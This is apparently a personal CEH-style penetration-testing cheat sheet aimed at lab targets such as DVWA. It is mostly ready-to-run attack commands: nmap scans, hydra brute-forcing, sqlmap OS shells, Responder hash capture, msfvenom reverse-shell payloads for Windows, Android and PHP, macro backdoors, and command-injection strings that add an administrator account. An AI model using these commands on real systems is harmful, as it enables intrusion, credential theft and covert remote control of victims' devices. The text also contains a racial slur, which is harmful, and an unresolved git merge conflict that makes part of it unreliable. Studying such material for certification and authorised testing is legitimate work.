

## Scanning Networks

### Host Discovery

```graphql
# ARP Ping Scan
nmap -sn -PR [IP]
# UDP Ping Scan
nmap -sn -PU [IP]
# ICMP Echo Ping Scan
nmap -sn -PE [IP or IP Range]
# ICMP Timestamp Ping
nmap -sn -PP [IP]
# ICMP Address Mask Ping
nmap -sn -PM [IP]
# TCP SYN Ping Scan
nmap -sn -PS [IP]
# TCP ACK Ping Scan
nmap -sn -PA [IP]
# IP Protocol Ping Scan
nmap -sn -PO [IP]
```

### Port and Service Discovery

```graphql
# TCP Connect Scan
nmap -sT -v [IP]
# Stealth Scan
nmap -sS -v [IP]
# Xmas Scan
nmap -sX -v [IP]
# TCP Maimon Scan
nmap -sM -v [IP]
# ACK Probe
nmap -sA -v [IP]
# UDP Scan
nmap -sU -v [IP]
# Idle/IPID Scan
nmap -sI -v [IP]
# SCTP INIT Scan
nmap -sY -v [IP]
# SCTP COOKIE ECHO Scan
nmap -sZ -v [IP]
# Detect Service Versions
nmap -sV -v [IP]
# Aggressive Scan
nmap -A -v [IP]
```

## System Hacking

### Online Password Attack using Responder + John

```bash
# Run Responder (Linux)
cd Responder
chmod +x ./Responder.py
sudo ./Responder.py -I eth0
# Crack captured hash
sudo snap install john-the-ripper
sudo john /home/ubuntu/Responder/logs/SMB-NTLMv2-SSP-[IP].txt
```

### Covert Channels (Covert_TCP)

- Compile & run covert_tcp.c on attacker + target.
- Use `tcpdump` / Wireshark to capture hidden packets.

## Web Application Hacking

### Brute-Force with Burp Suite

1. Set proxy → 127.0.0.1:8080
2. Capture login request → send to Intruder
3. Select attack type: _Cluster bomb_
4. Load wordlists → start attack
5. Filter status 302 → extract valid credentials

### WordPress Enumeration with WPScan + Metasploit

```bash
# WPScan
wpscan --api-token <TOKEN> --url http://10.10.10.16:8080/CEH \
--plugins-detection aggressive --enumerate u
# Metasploit Login Brute-Force
service postgresql start
msfconsole
use auxiliary/scanner/http/wordpress_login_enum
set PASS_FILE passwords.txt
set RHOST 10.10.10.16
set RPORT 8080
set TARGETURI /CEH
set USERNAME admin
run
```

## SQL Injection with sqlmap

```bash
# Extract databases
sqlmap -u "http://target/viewprofile.aspx?id=1" --cookie="SESSION=xyz" --dbs
# Extract tables from database
sqlmap -u "http://target/viewprofile.aspx?id=1" --cookie="SESSION=xyz" -D moviescope --tables
# Dump a specific table
sqlmap -u "http://target/viewprofile.aspx?id=1" --cookie="SESSION=xyz" -D moviescope -T User_Login --dump
# Get an OS Shell
sqlmap -u "http://target/viewprofile.aspx?id=1" --cookie="SESSION=xyz" --os-shell
```

```sql
mysql -U qdpmadmin -h 192.168.1.8 -P passwod 
show databases;
use qdpm;
show tables;
select * from users;
show dtabases;
use staff;
show tables;
select * from login;
select * from user;
```

### Enumeration

```bash
enum4linux 10.10.60.11
```

#### host enumation
host and service enumeration
```bash
//discover devices inside the network eth0
netdiscover -i eth0
nmap -sN 10.10.10.0/24
// enumeration
netstat -a 10.10.10.10 // netstat enumeration netbios
snmp-check 10.10.10.10 // extract users from netbios - parrot
enum4linux

sudo nmap -vv -p 1-1000 -sC -A 10.10.10.10 -oN nmap_scan
nmap -p- -sS -min-rate 10000 -Pn -n 10.10.10
nmap -6 www.scanme.com // scan IPV6
nmap -sC -sV -vvv -T5 -p 80,21,2222 10.10.10
sudo nmap -v -sV -sC
nmap -Pn -sS -n 10.10.. -T4 -oN nmap_scan // [prefer] fast scan ufo mode
nmap -v -p- -sV -sC -T4 10.10 -oN nmap_scan // UDP/TCP scanning
sudo nmap -p- -Pn -vvv -sS 10.10.. -oN nmap_scan
nmap -sS -sV -A -O -Pn
nmap -sV -sT -sU -A 10.10.. -oN nmap_scan
sudo nmap -p- 10.10.. --open -oG nmap/AllPorts -vvv -Pn -n -sS
sudo nmap -p22,80 -sV -sC -Pn -n 10.10.. -oN nmap/openports -vvv
nmap -sV -p 22,443 10.10../24 // scan mi net 24
nmap -sU -p 161 -sV -sC 10.10.. // UDP Scan
nmap -A --min-rate=5000 --max-retries=5 10.10.. // optimize scan time
<<<<<<< HEAD
nmap -Pn -sS -A -oX test 10.10.10.0/24 // Scanning the network and subnet

-PR = ARP ping scan
-PU = UDP ping scan
=======
nmap -Pn -sS -A -oX test 10.10.../24 // scanning network subnet

//scripts
snmp //extract users of the network port 161

-PR = ARP ping scan
-PE = ICMP scan echo
-PU = UDP ping scan
-oX = save XMl
>>>>>>> df364a4f409faf7bc6bb4b291db58d3dcabb2bb9
-vv = verbose
-p = ports
-sC = default scripts
-A = agressive scan
-oN = save in a file
-sS = syn scan is untrusive because don't complete the petitions
-n = no resolution of dns
-p- = all ports
-sV = Probe open ports to determine service/version inf
-T4 = Timing scanning <1-5>
-o = output to save the scan
-sT = TCP port scan
-sU = UDP port scan
-A = Agressive/ OS detection  
--open = all ports open
-oG = save in a grep format
-Pn = no do ping to the ip
-n = dont resolve domain names
--max-retries = 1 default verify 10 times.
-O = verifica el sistema operativo

// My niggerian methodology
nmap -sV -sC nmap 10.10.10.x #top1000ports
nmap -sC -sV -v -oN nmap.txt
masscan -e tun0 -p1-65535 -rate=1000 <ip>
sudo nmap -sU -sV -A -T4 -v -oN udp.txt ip
```

```bash
nmap -sn 10.10.10.10/24 -oN nmap.txt
nmap -sC -sV -sS -O 10.10.10.11 -oN nmap.txt
nmap -A 10.10.10.10/24 -oN nmap.txt

nmap -sn -O 172.16.43.1/24 
nmap -sS -sC -sV -O 172.16.43.3 -oN nmap.txt
nmap 172.16.43.1/24

nmap -sV -sC -pA nmap 10.10.10.x
nmap -sC -sV -v -oN nmap.txt 10.10.10.10
nmap -sU -sV -A t4 -v -oN udp.txt 10.10.10.1

nmap -f IP
nmap -sn -PR IP
nmap -sn -PE ip-range
nmap -sn 10.10.10.10/24
nmap -sC -sS -sV -O IP
nmap -A IP

-sn disable port scan
-PR ARP ping scan
-PU UDP ping scan
-PE ICMP ECHO ping scan
-f  Splits IP into fragment packets

nmap --script smb-os-discovery.nse IP 
#Displays OS, Computer-Name, Domain, WorkGroup and Ports.
```

#### Web Enumeration
```bash
// dir enumeration
gobuster dir -u 10.10.. -w /usr/share/wordlists/dirb/common.txt -t 50 -x php,html,txt -q

dir : directory listing
-u : host
-w : wordlists
-t : threads int / Number of concurrent threads (default 10)
-x : enumerate hidden files htm, php
-q : –quiet / Don’t print the banner and other noise

// wordpress enumeration
wpscan --url https://localchost.com --passwords=
wpscan -u 10.10.. -e u vp
wpscan -u 10.10.. -e u --wordlist path/rockyou.txt //bruteforce

-e = enumerate
u = enumerate usernames
vp = vulnerable plugins

// wordlist generation
cewl -w wordlist -d 2 -m 5 http://wordpress.com
-d = deeph of the scanning
-m = long of the words
-w = save to a file worlist
```

#### enumerating -samba
```bash
search for commands
smbmap --help | grep -i username

smbmap -u "admin" -p "passowrd" -H 10.10.10.10 -x "ipconfig"
-x = command
```

#### Domain

```
NET USERS /DOMAIN >USERS.TXT
Domain: TEST.local
User Enumeration:
  Windows:
    net user
    net user /domain
    net user [username]
    net user [username] /domain
```

#### SNMP

```
nmap -sU -P 161 IP
snmp-check IP
Displays Network Info, Network Interfaces, Network IP, Routing Info, TCP connection and listening, process, Storage info, File System and Device Info.
```


#### NetBios

```
nbstat -a IP
-a netbios name table
-c list contents of Netbios name cache

net use
Displays connection status, Shared folder/drive and Network Information.
```

### web explotation
```bash
// sql injection
sqlmap -u http://10.10.197.40/administrator.php --forms --dump

-u = url
--forms = grab the forms /detect
--dump = retrieve data form de sqli

#### basic sqli injection
sqlmap -u 10.10.77.169 --forms --dump

- u = url
- --forms= check the forms automatically
- --dump= dump dthe database data entries

// extract database
sqlmap -u http://localchost.com/hey.php?artist=1 --dbs
// extract colums
Sqlmap -u http://localchost.com/hey.php?artist=1 --D (tabla) --T artists --columns
// extract data of the table and the column inside of the db
sqlmap -u http://localchost.com/hey.php?artist=1 --D (tabla) --T artist --C adesc, aname, artist_id --dump
```

### bruteforcing
```bash
hydra -t4 -l lin -P /usr/share/wordlists/rockyou.txt ssh:10.10.149.11
hydra -l lin -P /usr/share/wordlists/rockyou.txt ssh:10.10.149.118
```

#### Wordpress
```bash
wpscan --url http://172.16.0.27:8080/CEH/ -u james -P /path/pass.txt
wpscan --url https://example/ --enumerate u (To enumerate the user)
```

### stego
```bash
exiftool cats.png
zsteg cats.png
binwalk -d cats.png

// windows
snow -C -p "magic" readme2.txt
-p = passowrd
//image steganography
openstego > extract dat > 

//stegseek to crack stego password
```

```
snow.exe -C -p "test" confidential.txt

-C  compressing / uncompressing
-p  password
```

### windows rpc mal configurado
```bash
rpcclient 10.10.123.10
```

### hashcracking
#### hashcat
```bash
hashcat -O -w3 -m 0 56ab24c15b72a457069c5ea42fcfc640 /usr/share/wordlists/rockyou.txt --show

-m = type of hash
-a = attack mode (1-3) 3 bruteforcing
--show = mostrar hash crackeado

hashcat -O -A 0 -m 20 salt12314124:passowrdmd523432 /usr/share/worlist/rockyou.txt
hashcat -O -a 0 -m 20 0c01f4468bd75d7a84c7eb73846e8d96:1dac0d92e9fa6bb2 /usr/share/wordlists/rockyou.txt --show
```

#### john
```bash
john --format=Raw-MD5 hash --wordlist=/usr/share/wordlists/rockyou.txt

- --format = hash format '--list=formats | grep MD5'
- hash = file - echo '123213dasd' >> hash
- wordlist= = wordlist to crack

### to show the hash cracked
john --show --format=Raw-MD5 hash

- --show = show the hash:Cracked
```

#### cryptography
```bash
//HashCalc
take a file and open into hashcalc
i will give you the the hash for md5 or other algorithms

// MD5 calculator
it will compare both files what we need get the md5

// HashMyFiles
it allow you to hash all the files inside a folder

// Veracrypt
```

#### rainbowtables
```bash
Rainbowtables are already hash with password to perform cracking without calculate a new hash.
// linux
rtgen // rainbowcrack
rtgen sha256 loweralpha-numeric 1 10 0 1000 4000 0 // generate a new rainbow table
// windows
rtgen md5 loweralpha-hnumeric 1 4 1 1000 1000 0 //
then use app rainbowcrack // add the hashes and the rainbow table option
```

### wireshark

#### filters
```bash

// filters by post
http.request.method==POST
smtp // email
pop // email
dns.qry.type == 1 -T fields -e dns.qry.name = show records present in this pcap
dns.flags.response == 0 = There are 56 unique DNS queries.
tcp // show tcp packets
//find packets
edit > find packets > packet list : packet bytes > case sensitive: strings > string "pass" :search


/// tshark cli
tshark -r dns.cap | wc -l //count how many packets are in a capture
tshark -r dns.cap -Y "dns.qry.type == 1" -T fields -e dns.qry.name //show records present in this pcap
tshark -r dnsexfil.pcap -Y "dns.flags.response == 0" | wc -l 
tshark -r pcap -T fields -e dns.qry.name | uniq | wc -l //There are 56 unique DNS queries.
tshark -r pcap | head -n2 //DNS server side to identify 'special' queries
tshark -r pcap -Y "dns.flags.response == 0" -T fields -e "dns.qry.name" | sed "s/.m4lwhere.org//g" | tr -d "\n" `exfiltrate data with regx`
```

#### DDoS
https://www.comparitech.com/net-admin/wireshark-cheat-sheet/
https://www.hackers-arise.com/post/2018/09/27/network-forensics-part-2-detecting-and-analyzing-a-scada-dos-attack

```bash
look number of packets first column
then >statistics > ipv4 statistics > destination and ports
```

To find DOS (SYN and ACK) : tcp.flags.syn == 1  , tcp.flags.syn == 1 and tcp.flags.ack == 0\
To find passwords : http.request.method == POST

#### Privilege scalation reverse shell

```bash
ssh -p 2222 mith@10.10.123.23
sudo -ls ###list de su permisions

sudo vim -c ':!/bin/sh' ### privilege scalation
```
https://gtfobins.github.io/

#### other
```bash
hydra -l root -P passwords.txt [-t 32] ftp
hydra -L usernames.txt -P pass.txt mysql
hashcat.exe -m hash.txt rokyou.txt -O
nmap -p443,80,53,135,8080,8888 -A -O -sV -sC -T4 -oN nmapOutput 0.10.10 
wpscan --url https://10.10.10.10 --enumerate u
netdiscover -i eth0
john --format=raw-md5 password.txt [ To change password to plain text ]
```

#### vulnerability scanning
```
nikto -h url -Cgidirs all
```

#### System hacking
```bash
// 1 - on a windows machine
wmic useraccount get name,sid //list users
// using a tool
Pwdump7.exe >> /path/file.txt //get a file to crack
// using ophcrack to crack the hash with rainbow tables
ophcrack >> tables >> vista free
// cracking with rainbow tables using winrtgen to create a rainbow table
winrtgen >> add table >> hashntlm
rainbowcrack >> select the obtained file >> select dircreatd with winrtgen

// 2 - using responder to capture the traffic of the windows system
//run a shared folder on windows
//capture the ntlm hash >> cracking with jhon
chmod +x responder.py
./Responder.py -I eth0
-I = interface //ifconfig
// cracking the ntlm capture with ntlm
john capture.txt

lopthcr4ck // helps to crack ntlm passwords store on windows

// system hacking windows
// look for an exploit and try to get remote access to the victim using msfvnom,metasploit and rat

msfvenom -p windows/meterpreter/reverse_tcp --platform windows -a x86 -f exe LHOST=my.ip LPORT=my.port -o /root/Desktop/test.exe
-p = payload
--platform = Os
-a = architecture
-f = format of the payload
-o = output dir

// now with try to share the file with the victim
// we try three forms
// #1 - option
mkdir /var/www/html/share
chmod -R 755 /var/www/html/share
chown -R www-data:www-data /var/www/html/share
// copy the text.exe to the new server
cp /root/Desktop/test.exe /var/www/html/share
// #2 - option
python -m SimpleHttpServer 80
// #3 - option
python3 http.server 80
// start the serverwith apache
service apache2 start //apache version
//now we open msfconsole to gain a inverse shell with meterpreter
use exploit/multi/handler //similar to nc -nlvp .port
set payload windows/meterpreter/reverse_tcp
set LHOST my.ip
set LPORT my.port
exploit/run // run the exploit
//share the file with the victim
my.ip/share
//inside the victim's machine
run the exe // text.exe share with the server
//look at the metasploit session
sysinfo // system info

//now with try to enumerate to know misconfigurations on the w10 system
//using PowerSploit
upload /path/PowerUp.ps1 powerup.ps1 // with meterpreter
shell // with shell with change from meterpreter to windows shell
// now we execute powerup
powershell -ExecutionPolicy Bypass -Command ". .\PowerUp.ps1;Invoke-AllChecks"
// now we know that windows is vulnerable to dll injection
// change to meterpreter shell with exit & run
run vnc // will open a VNC remote control on the victim

// Now we will try another method to gain access to a machine
// with TheFatRat
chmod +x fatrat
chmod +x setup.sh
chmd +x powerfull.sh
./setup.sh
//run fatrat
option 6 // create fud.. [Excelent]
option 3 // create apache + ps1
//put the lhost and lport
enter the name for files : payload
option 3 // for choosing meterpreter/reverse_tcp
// payload generated
option 9 // back to the menu
option 7 // create a back office
option 2 // macro windows and select lhost and lport
// enter the name for the doc file
// use custom exe backdoor Y
option 3 // reverse_tcp 
// backdoor inside the doc generate

// share document with the server option 1 and 2 above
// start msfconsole to gain meterpreter shell
use exploit/multi/handler
set payload windows/meterpreter/reverse_tcp
set LHOST my.ip
set RHOST my.port
exploit / run 

```

#### Mobile Hacking
```bash
// create a backdoor with msfvenom
msfvenom -p android/meterpreter/reverse_tcp --platform android -a dalvik LHOST=my.ip R > path/backdoor.apk
// share with some of the three methods above
// now with metasploit
use exploit/multi/handler
set payload android/meterpreter/reverse_tcp
set LHOST my.ip
exploit -j -z // exploit with a background job
// install the apk in android & the session will open
sessions -i 1 // will display the meterpreter
sysinfo // to know the os

// Using PhoneSploit
run phonesploit
option 3 // new phone
enter the ip // ip' phone &
option 4 // to shell on the phone
//in the menu you can search, download, info
```

#### Using the methodology
1.  `netdiscover -i eth0`
2.  `map -p- 10.10.10.10 [ Any IP ]` port discovery
3. `nmap -p443,80,53,135,8080,8888 -A -O -sV -sC -T4 -oN nmapOutput 10.10.10.10`
4. `gobuster -e -u** http://10.10.10.10 -w wordlsit.txt` on a webserver running
5. trying sqli payloads on the forms
```sql
admin' --  
admin' #  
admin'/*  
' or 1=1--  
' or 1=1#  
' or 1=1/*  
') or '1'='1--  
') or ('1'='1—
```
6. bruteforcing web servers
```bash
hydra -l root -P passwords.txt [-t 32] <IP> **_ftp_**
hydra -L usernames.txt -P pass.txt <IP> **_mysql_**
hydra -l USERNAME -P /path/to/passwords.txt -f <IP> **_pop3_** -V
hydra -V -f -L <userslist> -P <passwlist> **_rdp_**://<IP>
hydra -P common-snmp-community-strings.txt target.com **_snmp_**
hydra -l Administrator -P words.txt 192.168.1.12 **_smb_** -t 1
hydra -l root -P passwords.txt <IP> **_ssh_**
```
7. `cewl example.com -m 5 -w words.txt` custom wordlist
8. search for vulns
```bash
searchsploit 'Linux Kernel'
searchsploit -m 7618 // Paste the exploit in the current directory
searchsploit -p 7618[.c] // Show complete path
searchsploit — nmap file.xml // Search vulns inside a Nmap XML result
``` 

### Crypto

Hash identifier and Hash cracking

Hash Identifier
https://www.onlinehashcrack.com/hash-identification.php

Hash-identifier (CLI)

Hash Crack
https://crackstation.net/
https://hashes.com/en/decrypt/hash

```
Hashcat -a 3 -m 900 hash.txt /rockyou.txt

-a attack mode
-m hashtype
900 md4
1000 NTLM
1800 SHA512CRYPT
110 SHA1 with SALT HASH
0  MD5
100 SHA1
1400 SHA256
3200 BCRYPT
160 HMAC-SHA1
```

John
1. First analyze hash type - `john hashfile.hash`
2. Then crack hash - `john hashfile.hash --wordlist=/usr/share/wordlists/rockyou.txt --format=Raw-SHA1`
3. Show the cracked password - `john --show --format=Raw-SHA1 hashfile.hash` OR `john --show hashfile.hash


Hydra

- **FTP**: hydra -l user -P passlist.txt [ftp://10.10.46.122](ftp://10.10.46.122/)

            hydra -L userlist.txt -P passlist.txt [ftp://10.10.46.122](ftp://10.10.46.122/)

- SSH: hydra -l <username> -P <full path to pass> 10.10.46.122 -t 4 ssh
- Post Web Form: hydra -l <username> -P <wordlist> 10.10.46.122 http-post-form "/login:username=^USER^&password=^PASS^:F=incorrect" -V

- `hydra -L /root/Desktop/Wordlists/Usernames.txt -P /root/Desktop/Wordlists/Passwords.txt ftp://[IP]`
- `hydra -l root -P passwords.txt [-t 32] <IP> ftp
- `hydra -L usernames.txt -P pass.txt <IP> mysql
- `hydra -l USERNAME -P /path/to/passwords.txt -f <IP> pop3 -V`
- `hydra -V -f -L <userslist> -P <passwlist> ***rdp***://<IP>`
- `hydra -P common-snmp-community-strings.txt target.com snmp
- `hydra -l Administrator -P words.txt 192.168.1.12 smb t 1
- `hydra -l root -P passwords.txt <IP> ssh

### Android
```
PhoneSploit
https://n00bie.medium.com/hacking-android-using-phonesploit-ffbb2a899e6

apt-get install adb
git clone github.com/01010000/phonesploit
cd phonesploit
pyhton3 phonesploit.py
3 (Connect to new phone)
Add IP address of android device
4 (Access shell on phone)
IP address again of android device
pwd
ls
cd sdcard
ls
cd downloads
cat accnt-info.txt
```


## Tools

- **Nmap** → Scanning & enumeration
- **Hydra** → Brute-force FTP
- **sqlmap** → SQL injection automation
- **WPScan** → WordPress scanning
- **John / Hashcat** → Password cracking
- **Responder** → LLMNR poisoning
- **Metasploit** → Exploitation framework
- **Wireshark / Tcpdump** → Traffic analysis
- **Steghide / OpenStego** → Steganography
- Veracrypt
- Cryptool
- Snow
- Bctextencoder
- Md5 & sha1 checksum utility
- WinSCP
- OWASP ZAP
- RDP

## General Tips

1. Check which hosts have rdp enabled: perform the port scan on 3389 and then os discovery on open port host to get os of that rdp enabled host.
2. Check the mysql service running on which host. Same as 1.
3. Extract username and password of ftp ( hydra tool + desktop wordlist folder)
4. password.txt file using veracrypt (disk encryption)
5. Decrypt the 3des encryption using cryptool.
6. Extract the pin using openstego
7. Perform steganalysis on the txt file using snow tool
8. Brute force on the website using burpsuite ( using intruder)
9. Crack hash file using john ( the hash file is located in the responder tool logs file)
10. Find the flag file from the ftp ⇒ use the credentials cracked in previous challenge
11. Perform remote os command injection and to get the content from pin file
12. Compare the hashes using md5 and to see which file is tampered.
13. Cryptool on top, click on encryption / decryption and then click on asymmetric and select tripe des ecb and set 11 11 11 in all. First open file in the given tool
14. Remote command injection attack:\
    Snow.exe -C -p “given_password” file_name \
    | dir c:\# \
    | dir c:\ "pin.txt" \
    ! Take pin.txt \

### Command Injection

#### Easy

Execute 127.0.0.1 & & net user
Execute 127.0.0.1 & & net user & & ver command
Execute 127.0.0.1 & & net user & & getmac

#### Medium

127.0.0.1&net user
127.0.0.1&net user&sc query&systeminfo
127.0.0.1&;&ipconfig

#### High

127.0.0.1|net user

### Fileupload

msfvenom -p php/meterpreter/reverse_tcp lhost=192.168.1.104 lport=3333 -f raw

type GIF98 before PHP code and save as shell.jpeg.

Copy the uploaded path

Click on command injectio and type below command
|copy C:\xampp\htdocs\DVWA\hackable\uploads\shell.jpeg
C:\xampp\htdocs\DVWA\hackable\uploads\aa.php

Msfconsole
Use multi/handler
Set payload php/meterpreter/reverse_tcp
Set lhost
Set lport
Run

## Other Commands
```
Net  user
Snow.exe -C -p “given_password” file_name
—---------------------

wpscan --url http://10.10.10.12:8080/CEG --enumerate u
msfconsole
use axiliary/scanner/http/wordpress_login_enum
PASS_FILE /root/Desktop/wordlists/Passwords.txt
set RHOSTs 10.10.10.12
set RPORT 8080
set TARGETURI http://10.10.10.12:8080/CEH/
set USERNAME admin
run

—------------------------
Nmap -Pn -p 21 target > ftp
grep -B 5 open ftp

—--------------------------
Nmap -Pn -p 3389 target > rdp
grep -B 5 open rdp
—-------------------------
Nmap -Pn -p 3306 target > mysql
grep -B 5 open mysql

Hydra -l james -P given_wordlist ftp://target
```

```
Login to DVWA
Set the Security Level "Low"
Click on the Command Injection Tab 
Check the parameter is vulnerable or not and it is vulnerable 
Now enter the system cmd's
| hostname
| whoami
| dir C:\path.txt
| type path.txt

| net user
| net user Test /Add
| net user
| net user Test
| net localgroup Administrators Test /Add

Succefully created the "Test" user account.
```



